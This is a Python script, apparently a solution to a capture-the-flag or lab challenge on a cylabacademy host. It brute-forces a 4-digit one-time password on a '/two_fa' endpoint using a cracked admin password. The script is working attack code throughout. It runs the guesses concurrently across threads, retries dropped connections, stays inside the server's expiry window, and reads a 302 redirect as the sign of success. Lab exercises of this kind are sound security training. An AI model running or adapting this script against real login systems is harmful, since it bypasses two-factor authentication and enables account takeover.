#!/usr/bin/env python3
"""
Brute-force the 4-digit OTP on /two_fa within the 120-second server-side window.

Usage:
    python3 otp_brute.py <base_url> <username> <password>

Example:
    python3 otp_brute.py http://xebec.cylabacademy.net:46263 admin <cracked_password>
"""

import sys
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed

# Werkzeug's dev server (what Flask uses by default) is single-threaded or
# very lightly threaded. Too much concurrency just causes it to drop
# connections (RemoteDisconnected) rather than go faster. Keep this modest.
THREADS = 8
TIME_BUDGET = 110       # stay under the 120s server-side expiry with margin
MAX_RETRIES_PER_OTP = 3


def build_session():
    session = requests.Session()
    retry = Retry(
        total=MAX_RETRIES_PER_OTP,
        backoff_factor=0.3,
        status_forcelist=[502, 503, 504],
        allowed_methods=["POST"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=THREADS, pool_maxsize=THREADS)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session


def login(session, base_url, username, password):
    r = session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        allow_redirects=True,
    )
    if "two_fa" not in r.url and "OTP" not in r.text and "otp" not in r.text.lower():
        print("[!] Login may not have reached the 2FA step. Response URL:", r.url)
    else:
        print("[*] Login submitted, 2FA step reached. OTP window started server-side.")
    return r


def try_otp(session, base_url, otp):
    # Manual retry loop on top of the adapter-level retries, since a
    # RemoteDisconnected from an overloaded dev server can still slip
    # through as a raw ConnectionError rather than a retryable status code.
    last_err = None
    for attempt in range(MAX_RETRIES_PER_OTP):
        try:
            r = session.post(
                f"{base_url}/two_fa",
                data={"otp": otp},
                allow_redirects=False,   # a 302 redirect to home = success
                timeout=10,
            )
            return otp, r.status_code, r.headers.get("Location", ""), r.text
        except requests.exceptions.RequestException as e:
            last_err = e
            time.sleep(0.2 * (attempt + 1))  # brief backoff, then retry this OTP
    # Give up on this OTP after retries; report it as a failure, not a crash
    return otp, None, "", f"ERROR: {last_err}"


def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <base_url> <username> <password>")
        sys.exit(1)

    base_url, username, password = sys.argv[1].rstrip("/"), sys.argv[2], sys.argv[3]

    session = build_session()
    login(session, base_url, username, password)

    start = time.time()
    found = None

    candidates = [f"{i:04d}" for i in range(0, 10000)]

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(try_otp, session, base_url, otp): otp for otp in candidates}

        error_count = 0
        checked_count = 0

        for future in as_completed(futures):
            if time.time() - start > TIME_BUDGET:
                print("[!] Time budget exceeded, stopping (OTP likely expired server-side).")
                break

            otp, status, location, body = future.result()
            checked_count += 1

            if status is None:
                error_count += 1
                continue  # this OTP couldn't be confirmed; ideally re-queue it, see note below

            # Confirmed via manual curl test:
            #   wrong OTP  -> 200 OK, re-renders 2fa.html in place
            #   correct OTP -> 302 redirect to home (session['logged'] = 'true')
            success = status == 302

            if success:
                found = otp
                print(f"[+] FOUND OTP: {otp}  (status={status}, location={location})")
                executor.shutdown(wait=False, cancel_futures=True)
                break

            if checked_count % 1000 == 0:
                print(f"[.] Checked ~{checked_count}, {error_count} errors so far...")

    elapsed = time.time() - start
    if found:
        print(f"\n[+] Success! OTP = {found}  (took {elapsed:.1f}s)")
    else:
        print(f"\n[-] Exhausted search or timed out after {elapsed:.1f}s without a hit.")
        print(f"    - {error_count} OTP(s) could not be confirmed due to connection errors")
        print("      (the dev server likely dropped them under load — these are UNTESTED,")
        print("       not confirmed-wrong. If no hit was found, consider rerunning with")
        print("       a fresh login/OTP and fewer THREADS to reduce drop rate.)")
        print("    - Try lowering THREADS further (e.g. 4) if drops persist")


if __name__ == "__main__":
    main()
